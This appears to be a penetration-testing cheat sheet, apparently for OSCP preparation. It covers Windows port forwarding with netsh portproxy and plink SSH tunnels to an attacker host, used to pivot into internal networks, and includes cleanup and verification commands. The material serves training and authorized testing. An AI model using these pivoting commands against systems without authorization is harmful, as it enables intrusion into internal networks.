# WINDOWS PORT FORWARDING

### netsh port forward

```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP
```

> Built-in Windows forwarding

**Why:** No tools needed

<details>
<summary>Example Output</summary>

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.1.10

Now from attacker:
curl http://PIVOT_IP:8080
(Access internal web app through Windows pivot)
```
</details>

---

### Remove netsh forward

```bash
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

> Cleanup

**Why:** Remove when done

<details>
<summary>Example Output</summary>

```
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

(Clean up after yourself)
(Important for OSCP reporting - document cleanup steps)
```
</details>

---

### Show netsh forwards

```bash
netsh interface portproxy show all
```

> List active forwards

**Why:** Verify setup

<details>
<summary>Example Output</summary>

```
netsh interface portproxy show all

Listen on ipv4:    Connect to ipv4:
Address  Port     Address       Port
0.0.0.0  8080     172.16.1.10   80
0.0.0.0  4445     172.16.1.10   445
(Verify your port forwards are active)
```
</details>

---

### plink.exe (PuTTY SSH)

```bash
plink.exe -L 8080:INTERNAL:80 user@ATTACKER_IP
```

> SSH tunnel from Windows

**Why:** If SSH client not available

<details>
<summary>Example Output</summary>

```
plink.exe -ssh -L 8080:172.16.1.10:80 attacker@10.10.14.2

OR for dynamic proxy:
plink.exe -ssh -D 1080 attacker@10.10.14.2
(SSH tunneling from Windows when OpenSSH isn't available)
```
</details>

---
